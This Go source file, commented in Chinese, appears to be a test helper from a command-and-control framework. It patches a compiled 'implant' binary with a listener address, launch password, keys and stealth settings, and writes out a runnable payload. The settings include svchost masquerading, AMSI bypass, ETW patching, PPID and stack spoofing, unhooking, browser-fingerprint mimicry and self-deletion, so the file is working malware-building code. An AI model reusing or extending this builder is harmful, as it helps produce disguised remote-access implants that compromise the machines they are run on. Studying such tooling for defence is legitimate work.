// e2etool 是本地端到端测试的辅助工具：把一个**自己编译的**植入体原始二进制
// 走与服务端 GenServer 相同的补丁管线，产出可直接运行的载荷。
//
// 存在的唯一理由：GenServer 用的是内嵌模板（生产构建，debuglog 是空实现），
// 客户端不产生任何日志。排障时需要在客户端看到"它到底连到哪、卡在哪一步"，
// 所以这里允许用 `-tags debug` 从源码编译一份带日志的载荷。
//
// 关键约束：客户端启动时会做**占位符残留检测**（fail-closed），
// 24 个占位符只要有任意一个没被替换就拒绝启动。所以这里必须把 GenServer
// 会填的字段全部填上 —— 少填一个就会看到"配置占位符未被替换，拒绝启动"。
//
// 它不参与产品运行路径，只被 scripts/e2e-windows.ps1 调用。
package main

import (
	"flag"
	"fmt"
	"os"

	"BackendTemplate/pkg/delivery"
)

func main() {
	in := flag.String("in", "", "原始植入体二进制（含占位符）")
	out := flag.String("out", "payload.exe", "输出载荷路径")
	listener := flag.String("listener", "", "协议://连接地址，如 tcp://127.0.0.1:18093")
	pass := flag.String("pass", "", "启动口令（payload 的 os.Args[1]）")
	vkey := flag.String("vkey", "", "监听器 VKey（32 字节）")
	salt := flag.String("salt", "", "监听器加密盐（16 字节）")
	osType := flag.String("os", "windows", "目标 OS")
	arch := flag.String("arch", "amd64", "目标架构")
	format := flag.String("format", "exe", "载荷格式")
	autoDelete := flag.String("autodelete", "0", "1=上线后自删除")
	sessionKeyInfo := flag.String("sessionkeyinfo", "8d2c91f4a6", "会话密钥派生上下文（必须与服务端 config.security.session_key_info 一致）")
	heartbeatMs := flag.String("heartbeat", "5000", "心跳间隔 ms")
	flag.Parse()

	if *in == "" || *listener == "" {
		fmt.Fprintln(os.Stderr, "必须提供 -in 与 -listener")
		os.Exit(2)
	}

	raw, err := os.ReadFile(*in)
	if err != nil {
		fmt.Fprintf(os.Stderr, "读取输入失败: %v\n", err)
		os.Exit(1)
	}

	// 与 GenServer 对齐：所有参与"残留检测"的占位符都要给出可解析的值。
	// 取值为客户端能接受的常规配置；排障场景故意关掉会干扰复现的加固项。
	opt := delivery.PatchOptions{
		ListenerConfig:      *listener,
		OS:                  *osType,
		Arch:                *arch,
		Pass:                *pass,
		VKey:                *vkey,
		EncryptSalt:         *salt,
		Format:              *format,
		AutoDelete:          *autoDelete,
		UserAgent:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		HTTPGetURI:          "/api/v1/status",
		HTTPPostURI:         "/api/v1/events",
		WSPath:              "/socket",
		HeartbeatMs:         *heartbeatMs,
		JitterPercent:       "10",
		ReconnectBaseDelay:  "3",
		ReconnectMaxRetries: "10",
		InjectTechDefault:   "CreateThread",
		MasqueradeName:      "svchost",
		QuietMode:           "0",
		ETWPatch:            "0",
		AmsiBypass:          "0",
		SyscallMode:         "none",
		MetadataChannel:     "cookie",
		Padding:             "1",
		Daemonize:           "0",
		TLSJA3:              "chrome_120",
		DNSLabelPrefix:      "dns",
		SessionKeyInfo:      *sessionKeyInfo,
		SleepMaskHide:       "0",
		StackSpoof:          "0",
		PpidSpoof:           "0",
		BlockDLLs:           "0",
		UnhookOnStart:       "0",
		HashPad:             false,
		Sign:                false,
	}

	patched, err := delivery.PatchClientBinary(raw, opt)
	if err != nil {
		fmt.Fprintf(os.Stderr, "补丁失败: %v\n", err)
		os.Exit(1)
	}
	if err := os.WriteFile(*out, patched, 0o755); err != nil {
		fmt.Fprintf(os.Stderr, "写出失败: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("已生成 %s（%d 字节，listener=%s）\n", *out, len(patched), *listener)
}
